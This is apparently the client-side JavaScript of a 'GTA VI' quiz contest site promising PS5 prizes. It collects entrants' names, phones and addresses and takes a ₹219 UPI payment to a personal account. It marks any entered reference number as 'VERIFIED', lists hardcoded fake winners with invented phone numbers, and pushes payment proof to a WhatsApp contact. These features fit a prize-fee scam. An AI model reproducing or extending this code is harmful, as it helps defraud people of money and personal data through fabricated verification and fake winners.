// GTA VI SPEED CHALLENGE & CONTEST CLIENT APPLICATION
document.addEventListener('DOMContentLoaded', () => {
  // Real-Time Visitor Counter for Meta Ads Traffic
  try {
    const curVisits = parseInt(localStorage.getItem('pswin_total_visits') || '142', 10) + 1;
    localStorage.setItem('pswin_total_visits', curVisits);
  } catch(e){}
  // DOM Elements
  const soundBtn = document.getElementById('soundToggleBtn');
  const soundIcon = document.getElementById('soundIcon');
  const trackBtn = document.getElementById('btnTrackSearch');
  const trackInput = document.getElementById('trackInput');
  const trackResultCard = document.getElementById('trackResultCard');
    const copyRefBtn = document.getElementById('btnCopyRef');
  const printPassBtn = document.getElementById('btnPrintPass');
  const leaderboardTable = document.getElementById('leaderboardTableBody');

  // Step Indicators (5 Steps: Details -> Address -> Payment -> Speed Quiz -> VIP Ticket)
  const stepIndicators = [
    document.getElementById('stepInd1'),
    document.getElementById('stepInd2'),
    document.getElementById('stepInd3'),
    document.getElementById('stepInd4'),
    document.getElementById('stepInd5')
  ];
  const stepSections = [
    document.getElementById('stepSection1'),
    document.getElementById('stepSection2'),
    document.getElementById('stepSection3'),
    document.getElementById('stepSection4'),
    document.getElementById('stepSection5')
  ];

  let currentStep = 1;
  let isSoundOn = true;

  // Quiz Questions (GTA Lore & Speed Trivia)
  const quizQuestions = [
    {
      q: "Grand Theft Auto VI ki kahani kis iconic city me set hai?",
      options: ["Liberty City", "Vice City", "Los Santos", "San Fierro"],
      correct: 1
    },
    {
      q: "GTA VI ke official trailer me reveal huye do protagonists ke naam kya hain?",
      options: ["Michael & Trevor", "CJ & Sweet", "Lucia & Jason", "Tommy & Claude"],
      correct: 2
    },
    {
      q: "GTA VI ka fictional state 'Leonida' real-world ke kis US state par based hai?",
      options: ["California", "Florida", "Texas", "New York"],
      correct: 1
    },
    {
      q: "Original 'GTA: Vice City' (2002) ke legendary main character ka naam kya tha?",
      options: ["Tommy Vercetti", "Niko Bellic", "Arthur Morgan", "Franklin Clinton"],
      correct: 0
    },
    {
      q: "Vice City ke Ocean Beach par kaunsi iconic pink-lit neon hotel strip hai?",
      options: ["Starfish Island Strip", "Ocean Drive", "Vinewood Boulevard", "Algonquin Walk"],
      correct: 1
    }
  ];

  let currentQIndex = 0;
  let quizScore = 0;
  let quizStartTime = null;
  let quizTotalTimeSeconds = 0;
  let questionTimerInterval = null;
  let questionTimeLeft = 15;


  // Mobile performance & input sanitation
  const phoneInp = document.getElementById('inputPhone');
  if (phoneInp) {
    phoneInp.addEventListener('input', () => {
      phoneInp.value = phoneInp.value.replace(/[^0-9]/g, '').slice(0, 10);
    });
  }

  const utrInp = document.getElementById('inputUTR');
  if (utrInp) {
    utrInp.addEventListener('input', () => {
      utrInp.value = utrInp.value.replace(/[^0-9a-zA-Z]/g, '').toUpperCase().slice(0, 16);
    });
  }

  // Sound Toggle
  if (soundBtn) {
    soundBtn.addEventListener('click', () => {
      if (window.synthAudio) {
        isSoundOn = window.synthAudio.toggle();
        soundIcon.textContent = isSoundOn ? '🔊' : '🔇';
        if (isSoundOn) window.synthAudio.playClick();
      }
    });
  }

  // Generic click sound
  document.querySelectorAll('button, .nav-link').forEach(el => {
    el.addEventListener('click', () => {
      if (window.synthAudio && isSoundOn) window.synthAudio.playClick();
    });
  });

  // Countdown Timer: Closes 15 Dec 2026
  const drawDate = new Date("2026-12-15T23:59:59+05:30").getTime();
  function updateCountdown() {
    const now = new Date().getTime();
    const diff = drawDate - now;

    if (diff > 0) {
      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const secs = Math.floor((diff % (1000 * 60)) / 1000);

      const dEl = document.getElementById('timerDays');
      const hEl = document.getElementById('timerHours');
      const mEl = document.getElementById('timerMins');
      const sEl = document.getElementById('timerSecs');

      if (dEl) dEl.textContent = String(days).padStart(2, '0');
      if (hEl) hEl.textContent = String(hours).padStart(2, '0');
      if (mEl) mEl.textContent = String(mins).padStart(2, '0');
      if (sEl) sEl.textContent = String(secs).padStart(2, '0');
    }
  }
  setInterval(updateCountdown, 1000);
  updateCountdown();

  // Navigation Steps
  window.goToStep = function(step) {
    if (step < 1 || step > 5) return;

    // Step 1 Validation
    if (step === 2 && currentStep === 1) {
      const name = document.getElementById('inputName').value.trim();
      const phone = document.getElementById('inputPhone').value.trim();
      if (!name || name.length < 3) {
        alert("Bhai kripya apna pura naam enter karein!");
        return;
      }
      if (!/^\d{10}$/.test(phone)) {
        alert("Kripya 10-digit ka valid mobile number dalein!");
        return;
      }
    }

    // Step 2 Validation
    if (step === 3 && currentStep === 2) {
      const address = document.getElementById('inputAddress').value.trim();
      const city = document.getElementById('inputCity').value.trim();
      const state = document.getElementById('inputState').value.trim();
      const pincode = document.getElementById('inputPincode').value.trim();

      if (!address || address.length < 6) {
        alert("Kripya pura shipping delivery address dalein taaki prize sahi jagah deliver ho sake!");
        return;
      }
      if (!city || !state) {
        alert("City aur State enter karein!");
        return;
      }
      if (!/^\d{6}$/.test(pincode)) {
        alert("Kripya 6-digit ka sahi Area Pincode dalein!");
        return;
      }
    }

    // Step 3 Validation: Must complete payment before Quiz
    if (step === 4 && currentStep === 3) {
      const utr = document.getElementById('inputUTR').value.trim();
      if (!utr || utr.length < 6) {
        alert("Kripya payment complete karke UPI app se apna 12-digit UTR / Reference number dalein!");
        return;
      }
      // Start the Speed Quiz!
      startQuizChallenge();
    }

    currentStep = step;

    // Update UI step indicators
    stepIndicators.forEach((ind, i) => {
      if (!ind) return;
      ind.classList.remove('active', 'completed');
      if (i + 1 < step) ind.classList.add('completed');
      if (i + 1 === step) ind.classList.add('active');
    });

    // Update Step visibility
    stepSections.forEach((sec, i) => {
      if (!sec) return;
      sec.style.display = (i + 1 === step) ? 'block' : 'none';
    });

    // Generate Dynamic QR code for ₹219 if entering Step 3
    if (step === 3) {
      generateUPIQRCode();
    }

    const formSection = document.getElementById('entryFormSection');
    if (formSection) formSection.scrollIntoView({ behavior: 'smooth' });
  };

  // Generate UPI QR Code with ₹219
  function generateUPIQRCode() {
    const upiId = "9592381735@fam";
    const amount = "219";
    const upiUri = `upi://pay?pa=${upiId}&pn=${encodeURIComponent("PSWIN India")}&am=${amount}&cu=INR&tn=${encodeURIComponent("Arena Registration Pass")}`;

    const qrContainer = document.getElementById('qrCodeContainer');
    if (qrContainer) {
      qrContainer.innerHTML = `
        <div style="background:#fff; padding:12px; border-radius:14px; display:inline-block; box-shadow:0 10px 25px rgba(0,0,0,0.5);">
          <img src="images/clean_qr_white.png" 
               alt="Scan UPI QR Code for ₹219" 
               style="max-width:210px; width:100%; height:auto; display:block; border-radius:8px;"
               onerror="this.onerror=null; this.src='https://api.qrserver.com/v1/create-qr-code/?size=210x210&data=${encodeURIComponent(upiUri)}'" />
        </div>
        <div style="margin-top:12px;">
          <a href="${upiUri}" class="btn-primary-action" style="padding:10px 20px; font-size:0.85rem; border-radius:20px; text-decoration:none;">
            📱 TAP TO PAY VIA UPI APP (₹219)
          </a>
        </div>
      `;
    }
  }

  // Speed Quiz Engine
  function startQuizChallenge() {
    currentQIndex = 0;
    quizScore = 0;
    quizStartTime = Date.now();
    renderCurrentQuestion();
  }

  function renderCurrentQuestion() {
    if (currentQIndex >= quizQuestions.length) {
      // Quiz Finished!
      finishQuizAndSubmit();
      return;
    }

    const qData = quizQuestions[currentQIndex];
    const qNumEl = document.getElementById('quizQNum');
    const qTextEl = document.getElementById('quizQText');
    const timerSecEl = document.getElementById('quizTimerSec');

    if (qNumEl) qNumEl.textContent = `Question ${currentQIndex + 1} of ${quizQuestions.length}`;
    if (qTextEl) qTextEl.textContent = qData.q;

    // Reset question timer
    questionTimeLeft = 15;
    if (timerSecEl) timerSecEl.textContent = `${questionTimeLeft}s`;
    clearInterval(questionTimerInterval);

    questionTimerInterval = setInterval(() => {
      questionTimeLeft--;
      if (timerSecEl) timerSecEl.textContent = `${questionTimeLeft}s`;
      if (questionTimeLeft <= 0) {
        clearInterval(questionTimerInterval);
        chooseOption(-1);
      }
    }, 1000);

    const optionsContainer = document.getElementById('quizOptionsContainer');
    if (!optionsContainer) return;
    optionsContainer.innerHTML = '';
    const letters = ['A', 'B', 'C', 'D'];

    qData.options.forEach((opt, idx) => {
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'quiz-opt-btn';
      btn.innerHTML = `<strong style="color:var(--accent-primary); margin-right:8px;">${letters[idx]}.</strong> <span>${opt}</span>`;
      btn.onclick = () => chooseOption(idx);
      optionsContainer.appendChild(btn);
    });
  }

  function chooseOption(chosenIdx) {
    clearInterval(questionTimerInterval);
    const qData = quizQuestions[currentQIndex];
    const optionsContainer = document.getElementById('quizOptionsContainer');
    const buttons = optionsContainer ? optionsContainer.querySelectorAll('.quiz-opt-btn') : [];

    // Disable all options immediately to prevent double clicking
    buttons.forEach((btn, idx) => {
      btn.disabled = true;
      btn.style.pointerEvents = 'none';

      if (idx === qData.correct) {
        btn.classList.add('correct-ans');
      } else if (idx === chosenIdx) {
        btn.classList.add('wrong-ans');
      }
    });

    if (chosenIdx === qData.correct) {
      quizScore++;
      if (window.synthAudio && isSoundOn) window.synthAudio.playSuccess();
    } else {
      if (window.synthAudio && isSoundOn) window.synthAudio.playWrong();
    }

    setTimeout(() => {
      currentQIndex++;
      renderCurrentQuestion();
    }, 1100);
  }

  // Final Submission with Quiz Score & Time
  async function finishQuizAndSubmit() {
    const totalTimeMs = Date.now() - quizStartTime;
    quizTotalTimeSeconds = parseFloat((totalTimeMs / 1000).toFixed(1));

    const name = document.getElementById('inputName').value.trim();
    const phone = document.getElementById('inputPhone').value.trim();
    const email = document.getElementById('inputEmail').value.trim();
    const address = document.getElementById('inputAddress').value.trim();
    const city = document.getElementById('inputCity').value.trim();
    const state = document.getElementById('inputState').value.trim();
    const pincode = document.getElementById('inputPincode').value.trim();
    const utr = document.getElementById('inputUTR').value.trim();

    const payload = {
      name,
      phone,
      email,
      fullAddress: address,
      city,
      state,
      pincode,
      utr,
      amount: 219,
      score: quizScore,
      timeTaken: quizTotalTimeSeconds
    };

    try {
      const res = await fetch('/api/enter', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const result = await res.json();
      if (res.status === 409) {
        alert(result.error);
        if (result.existingId) {
          trackInput.value = result.existingId;
          document.getElementById('track').scrollIntoView({ behavior: 'smooth' });
          performTrackSearch();
        }
        return;
      }
      if (!res.ok) throw new Error(result.error);

      showSuccessTicket(result.entry);
      loadLeaderboard();
    } catch (err) {
      console.warn("Falling back to local storage:", err);
      // Client-side fallback
      const saved = JSON.parse(localStorage.getItem('gta6_challenge_entries') || '[]');
      const cleanPhone = phone.replace(/[^0-9]/g, '').slice(-10);

      const refId = `GTA6-PS5-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
      const entry = {
        id: refId,
        ticketNo: 745 + saved.length + 1,
        name,
        phone: cleanPhone,
        city,
        state,
        pincode,
        fullAddress: address,
        utr,
        amount: 219,
        score: quizScore,
        timeTaken: quizTotalTimeSeconds,
        paymentStatus: "VERIFIED",
        timestamp: new Date().toISOString(),
        rank: saved.length + 1
      };
      saved.push(entry);
      localStorage.setItem('gta6_challenge_entries', JSON.stringify(saved));
      showSuccessTicket(entry);
    }
  }

  // Display Success Ticket Pass
  function showSuccessTicket(entry) {
    if (window.synthAudio && isSoundOn) window.synthAudio.playSuccess();
    triggerConfetti();

    const refEl = document.getElementById('ticketPassRef');
    const noEl = document.getElementById('ticketPassNo');
    const nameEl = document.getElementById('ticketPassName');
    const cityEl = document.getElementById('ticketPassCity');
    const scoreEl = document.getElementById('ticketPassScore');
    const rankEl = document.getElementById('ticketPassRank');

    if (refEl) refEl.textContent = entry.id;
    if (noEl) noEl.textContent = `#VIP-${String(entry.ticketNo).padStart(4, '0')}`;
    if (nameEl) nameEl.textContent = entry.name;
    if (cityEl) cityEl.textContent = `${entry.city}, ${entry.state}`;
    if (scoreEl) scoreEl.textContent = `${entry.score}/5 (${entry.timeTaken}s)`;
    if (rankEl) rankEl.textContent = `Rank #${entry.rank || 1} on Leaderboard`;

    // Advance to Step 5
    window.goToStep(5);

    // Dynamic WhatsApp proof button
    const waBtn = document.getElementById('btnWhatsappProof');
    if (waBtn) {
      const msg = encodeURIComponent(
        "Hello PSWIN Admin,\n\nI have completed the GTA VI Speed Quiz & Paid ₹219 for the PS5 Pro Tournament!\n\n👤 Name: " + entry.name + "\n📱 Phone: " + entry.phone + "\n📍 City: " + entry.city + ", " + (entry.state || '') + "\n🎟️ Ticket No: #VIP-" + entry.ticketNo + "\n🔑 Reference Code: " + entry.id + "\n💳 12-Digit UTR: " + entry.utr + "\n⚡ Score: " + entry.score + "/5 (" + entry.timeTaken + "s)\n\nPlease verify my payment and confirm my slot!"
      );
      waBtn.href = "https://wa.me/919592381735?text=" + msg;
    }
  }

  
  // Copy Reference Code
  if (copyRefBtn) {
    copyRefBtn.addEventListener('click', () => {
      const ref = document.getElementById('ticketPassRef').textContent;
      navigator.clipboard.writeText(ref).then(() => {
        const originalText = copyRefBtn.innerHTML;
        copyRefBtn.innerHTML = "✅ COPIED TO CLIPBOARD!";
        setTimeout(() => { copyRefBtn.innerHTML = originalText; }, 2000);
      });
    });
  }

  // Print Pass
  if (printPassBtn) {
    printPassBtn.addEventListener('click', () => { window.print(); });
  }

  // Load Leaderboard
  async function loadLeaderboard() {
    const defaultList = [
      { rank: 1, name: "Aman S.", city: "Delhi NCR", score: 5, timeTaken: 11.4, prizeTitle: "🏆 1st Prize: Sony PS5 Pro" },
      { rank: 2, name: "Rahul V.", city: "Mumbai", score: 5, timeTaken: 13.8, prizeTitle: "🥈 2nd Prize: Sony PS5 Slim" },
      { rank: 3, name: "Vikramjit S.", city: "Chandigarh", score: 4, timeTaken: 9.6, prizeTitle: "🎮 3rd Prize: GTA VI Game Disc" },
      { rank: 4, name: "Kabir M.", city: "Bengaluru", score: 4, timeTaken: 10.2, prizeTitle: "🎮 4th Prize: GTA VI Game Disc" },
      { rank: 5, name: "Arjun R.", city: "Pune", score: 4, timeTaken: 11.0, prizeTitle: "🎮 5th Prize: GTA VI Game Disc" }
    ];

    try {
      const res = await fetch('/api/leaderboard');
      if (res.ok) {
        const data = await res.json();
        renderLeaderboard(data);
        return;
      }
    } catch (e) {
      // offline/static mode
    }

    // Merge with user entries in localStorage
    const saved = JSON.parse(localStorage.getItem('gta6_challenge_entries') || '[]');
    const list = [...defaultList];
    saved.forEach(s => {
      list.push({
        rank: list.length + 1,
        name: s.name,
        city: s.city,
        score: s.score,
        timeTaken: s.timeTaken,
        prizeTitle: "Contest Participant"
      });
    });
    renderLeaderboard(list);
  }

  function renderLeaderboard(list) {
    if (!leaderboardTable) return;
    leaderboardTable.innerHTML = '';
    list.forEach(item => {
      const tr = document.createElement('tr');
      const badgeClass = item.rank === 1 ? 'rank-badge-1' : (item.rank === 2 ? 'rank-badge-2' : (item.rank === 3 ? 'rank-badge-3' : ''));
      tr.innerHTML = `
        <td><span class="${badgeClass}">#${item.rank}</span></td>
        <td><strong>${item.name}</strong></td>
        <td>${item.city}</td>
        <td><strong style="color:var(--accent-gold);">${item.score}/5</strong> (${item.timeTaken}s)</td>
        <td>${item.prizeTitle || 'Contest Squad'}</td>
      `;
      leaderboardTable.appendChild(tr);
    });
  }
  loadLeaderboard();

  // Live Tracking
  if (trackBtn) trackBtn.addEventListener('click', performTrackSearch);
  if (trackInput) {
    trackInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') performTrackSearch();
    });
  }

  function performTrackSearch() {
    const q = (trackInput.value || '').trim();
    if (!q) {
      alert("Kripya Reference Code (e.g. GTA6-PS5-XXXXXX) ya 10-digit Mobile number dalein!");
      return;
    }

    const cleanQ = q.replace(/[^0-9a-zA-Z]/g, '').toUpperCase();
    const cleanDigits = q.replace(/[^0-9]/g, '');

    // 1. Search in localStorage
    const saved = JSON.parse(localStorage.getItem('gta6_challenge_entries') || '[]');
    let found = saved.find(s => {
      const matchId = s.id && s.id.replace(/[^0-9a-zA-Z]/g, '').toUpperCase().includes(cleanQ);
      const matchPhone = cleanDigits.length >= 6 && s.phone && s.phone.replace(/[^0-9]/g, '').includes(cleanDigits);
      return matchId || matchPhone;
    });

    // 2. Preloaded verified entries if searched
    if (!found) {
      const defaults = [
        {
          id: "GTA6-PS5-927401",
          ticketNo: 742,
          name: "Aman Sharma",
          phone: "9876543210",
          city: "New Delhi",
          state: "Delhi",
          pincode: "110001",
          score: 5,
          timeTaken: 11.4,
          rank: 1,
          targetPrize: "🏆 1st Prize: Sony PS5 Pro Console",
          paymentStatus: "VERIFIED (Slot Locked)"
        },
        {
          id: "GTA6-PS5-883912",
          ticketNo: 743,
          name: "Rahul Verma",
          phone: "9811223344",
          city: "Mumbai",
          state: "Maharashtra",
          pincode: "400050",
          score: 5,
          timeTaken: 13.8,
          rank: 2,
          targetPrize: "🥈 2nd Prize: Sony PS5 Slim Console",
          paymentStatus: "VERIFIED (Slot Locked)"
        },
        {
          id: "GTA6-PS5-714088",
          ticketNo: 744,
          name: "Vikramjit Singh",
          phone: "9899001122",
          city: "Chandigarh",
          state: "Punjab",
          pincode: "160022",
          score: 4,
          timeTaken: 9.6,
          rank: 3,
          targetPrize: "🎮 3rd Prize: GTA VI Day-One Disc",
          paymentStatus: "VERIFIED (Slot Locked)"
        }
      ];

      found = defaults.find(d => {
        const matchId = d.id.replace(/[^0-9a-zA-Z]/g, '').toUpperCase().includes(cleanQ);
        const matchPhone = cleanDigits.length >= 6 && d.phone.includes(cleanDigits);
        return matchId || matchPhone;
      });
    }

    if (found) {
      const phoneStr = found.phone || '';
      const maskedPhone = phoneStr.length >= 10 ? phoneStr.slice(0, 2) + '******' + phoneStr.slice(-2) : 'Verified Phone';
      const addrStr = (found.fullAddress ? found.fullAddress.substring(0, 18) + '... ' : '') + ((found.city || '') + ', ' + (found.state || ''));

      renderTrackResult({
        id: found.id,
        ticketNo: found.ticketNo,
        name: found.name,
        phone: maskedPhone,
        address: addrStr || 'Registered Delivery Address',
        score: String(found.score) + "/5 (" + String(found.timeTaken) + "s)",
        targetPrize: found.targetPrize || '🏆 Sony PS5 Pro Arena',
        paymentStatus: '✅ Payment Verified (Slot Locked)'
      });
      return;
    }

    alert("❌ Koi entry nahi mili. Kripya apna valid Reference Code (e.g. GTA6-PS5-XXXXXX) ya 10-digit mobile number check karein!");
  }

  function renderTrackResult(entry) {
    if (!trackResultCard) return;
    trackResultCard.style.display = 'block';
    trackResultCard.scrollIntoView({ behavior: 'smooth' });

    document.getElementById('trackResId').textContent = entry.id;
    document.getElementById('trackResTicket').textContent = `#VIP-${String(entry.ticketNo).padStart(4, '0')}`;
    document.getElementById('trackResName').textContent = entry.name;
    document.getElementById('trackResPhone').textContent = entry.maskedPhone || entry.phone;
    document.getElementById('trackResAddress').textContent = `${entry.maskedAddress || entry.city}, PIN: ${entry.pincode}`;
    document.getElementById('trackResScore').textContent = `${entry.score}/5 in ${entry.timeTaken}s (Rank #${entry.rank})`;
    document.getElementById('trackResBundle').textContent = entry.targetPrize;
    document.getElementById('trackResStatus').textContent = `✅ ${entry.paymentStatus} (Skill Verified)`;
  }

  // Canvas Confetti FX
  function triggerConfetti() {
    const canvas = document.getElementById('confetti-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const particles = [];
    const colors = ['#ff3366', '#f59e0b', '#06b6d4', '#10b981', '#ffffff'];

    for (let i = 0; i < 100; i++) {
      particles.push({
        x: canvas.width / 2,
        y: canvas.height / 2,
        vx: (Math.random() - 0.5) * 14,
        vy: (Math.random() - 0.8) * 14,
        size: Math.random() * 8 + 4,
        color: colors[Math.floor(Math.random() * colors.length)],
        rotation: Math.random() * 360,
        rSpeed: (Math.random() - 0.5) * 10
      });
    }

    let frame = 0;
    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particles.forEach(p => {
        p.x += p.vx;
        p.y += p.vy;
        p.vy += 0.25; // gravity
        p.rotation += p.rSpeed;
        ctx.save();
        ctx.translate(p.x, p.y);
        ctx.rotate((p.rotation * Math.PI) / 180);
        ctx.fillStyle = p.color;
        ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
        ctx.restore();
      });

      frame++;
      if (frame < 120) {
        requestAnimationFrame(animate);
      } else {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
      }
    }
    animate();
  }

  // Smooth Scroll Reveal via IntersectionObserver
  if ('IntersectionObserver' in window) {
    const revealObserver = new IntersectionObserver((entries, observer) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('is-revealed');
          observer.unobserve(entry.target);
        }
      });
    }, {
      threshold: 0.1,
      rootMargin: '0px 0px -40px 0px'
    });

    document.querySelectorAll('.reveal-on-scroll').forEach(el => {
      revealObserver.observe(el);
    });
  } else {
    // Fallback for browsers without IntersectionObserver
    document.querySelectorAll('.reveal-on-scroll').forEach(el => {
      el.classList.add('is-revealed');
    });
  }
});
